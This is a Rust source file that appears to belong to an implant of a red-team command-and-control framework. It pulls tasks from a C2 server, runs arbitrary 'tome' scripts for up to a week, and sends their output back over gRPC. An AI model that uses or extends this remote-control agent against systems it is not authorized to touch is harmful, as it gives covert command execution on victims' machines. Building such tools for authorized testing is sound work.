use anyhow::{Error, Result};
use c2::pb::c2_client::C2Client;
use c2::pb::{ReportTaskOutputRequest, ReportTaskOutputResponse, Task, TaskOutput};
use chrono::{DateTime, Utc};
use eldritch::{eldritch_run, EldritchPrintHandler};
use std::collections::HashMap;
use std::sync::mpsc::Receiver;
use std::sync::mpsc::Sender;
use std::thread;
use std::time::Instant;
use tokio::task::JoinHandle;
use tokio::time::Duration;
use tonic::transport::Channel;
use tonic::Status;

pub struct AsyncTask {
    pub future_join_handle: JoinHandle<Result<(), Error>>,
    pub start_time: DateTime<Utc>,
    pub grpc_task: Task,
    pub print_reciever: Receiver<String>,
}

async fn handle_exec_tome(
    task: Task,
    print_channel_sender: Sender<String>,
) -> Result<(String, String)> {
    // TODO: Download auxillary files from CDN

    // Read a tome script
    // let task_quest = match task.quest {
    //     Some(quest) => quest,
    //     None => return Ok(("".to_string(), format!("No quest associated for task ID: {}", task.id))),
    // };

    let print_handler = EldritchPrintHandler {
        sender: print_channel_sender,
    };

    // Execute a tome script
    let res = match thread::spawn(move || {
        eldritch_run(
            task.id.to_string(),
            task.eldritch.clone(),
            Some(task.parameters.clone()),
            &print_handler,
        )
    })
    .join()
    {
        Ok(local_thread_res) => local_thread_res,
        Err(_) => todo!(),
    };
    match res {
        Ok(tome_output) => Ok((tome_output, "".to_string())),
        Err(tome_error) => Ok(("".to_string(), tome_error.to_string())),
    }
}

pub async fn handle_exec_timeout_and_response(
    task: Task,
    print_channel_sender: Sender<String>,
) -> Result<(), Error> {
    // Tasks will be forcebly stopped after 1 week.
    let timeout_duration = Duration::from_secs(60 * 60 * 24 * 7); // 1 Week.

    // Define a future for our execution task
    let exec_future = handle_exec_tome(task.clone(), print_channel_sender.clone());
    // Execute that future with a timeout defined by the timeout argument.
    let tome_result = match tokio::time::timeout(timeout_duration, exec_future).await {
        Ok(res) => match res {
            Ok(tome_result) => tome_result,
            Err(tome_error) => ("".to_string(), tome_error.to_string()),
        },
        Err(timer_elapsed) => (
            "".to_string(),
            format!(
                "Time elapsed task {} has been running for {} seconds",
                task.id,
                timer_elapsed.to_string()
            ),
        ),
    };

    print_channel_sender
        .clone()
        .send(format!("---[RESULT]----\n{}\n---------", tome_result.0))?;
    print_channel_sender
        .clone()
        .send(format!("---[ERROR]----\n{}\n--------", tome_result.1))?;
    Ok(())
}

pub async fn handle_tavern_response(
    loop_start_time: Instant,
    mut tavern_client: C2Client<Channel>,
    all_exec_futures: &mut HashMap<i32, AsyncTask>,
    running_task_res_map: &mut HashMap<i32, Vec<TaskOutput>>,
) -> Result<()> {
    let mut running_exec_futures: HashMap<i32, AsyncTask> = HashMap::new();

    for (task_id, async_task) in all_exec_futures {
        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Task # {} is_finished? {}",
            (Instant::now() - loop_start_time).as_millis(),
            task_id,
            async_task.future_join_handle.is_finished()
        );

        let mut task_channel_output: Vec<String> = vec![];

        // Loop over each line of output from the task and append it the the channel output.
        loop {
            #[cfg(debug_assertions)]
            eprintln!(
                "[{}]: Task # {} recieving output",
                (Instant::now() - loop_start_time).as_millis(),
                task_id
            );
            let new_res_line = match async_task
                .print_reciever
                .recv_timeout(Duration::from_millis(100))
            {
                Ok(local_res_string) => local_res_string,
                Err(local_err) => {
                    match local_err.to_string().as_str() {
                        "channel is empty and sending half is closed" => {
                            break;
                        }
                        "timed out waiting on channel" => {
                            break;
                        }
                        _ => eprint!("Error: {}", local_err),
                    }
                    break;
                }
            };
            // let appended_line = format!("{}{}", res.to_owned(), new_res_line);
            task_channel_output.push(new_res_line);
        }

        let task_is_finished = async_task.future_join_handle.is_finished();
        let task_response_exec_finished_at = match task_is_finished {
            true => Some(Utc::now()),
            false => None,
        };

        // If the task is finished or there's new data queue a new task result.
        if task_is_finished || task_channel_output.len() > 0 {
            let task_response = TaskOutput {
                id: async_task.grpc_task.id.clone(),
                exec_started_at: Some(prost_types::Timestamp {
                    seconds: async_task.start_time.timestamp(),
                    nanos: async_task.start_time.timestamp_subsec_nanos() as i32,
                }),
                exec_finished_at: match task_response_exec_finished_at {
                    Some(timestamp) => Some(prost_types::Timestamp {
                        seconds: timestamp.timestamp(),
                        nanos: timestamp.timestamp_subsec_nanos() as i32,
                    }),
                    None => None,
                },
                output: task_channel_output.join("\n"),
                error: None,
            };

            running_task_res_map
                .entry(*task_id)
                .and_modify(|cur_list| cur_list.push(task_response.clone()))
                .or_insert(vec![task_response]);
        }

        running_exec_futures.retain(|_index, exec_task| exec_task.future_join_handle.is_finished())
    }

    // Iterate over queued task results and send them back to the server
    for (task_id, task_res) in running_task_res_map.clone().into_iter() {
        for output in task_res {
            match send_tavern_output(&mut tavern_client, output).await {
                Ok(_) => {
                    // Remove output that has been reported sucessfully.
                    running_task_res_map.remove(&task_id);
                }
                Err(local_err) => {
                    #[cfg(debug_assertions)]
                    eprintln!("Failed to submit task resluts:\n{}", local_err.to_string());
                    {}
                }
            };
        }
    }

    Ok(())
}

async fn send_tavern_output(
    tavern_client: &mut C2Client<Channel>,
    output: TaskOutput,
) -> Result<tonic::Response<ReportTaskOutputResponse>, Status> {
    let req = tonic::Request::new(ReportTaskOutputRequest {
        output: Some(output),
    });
    tavern_client.report_task_output(req).await
}
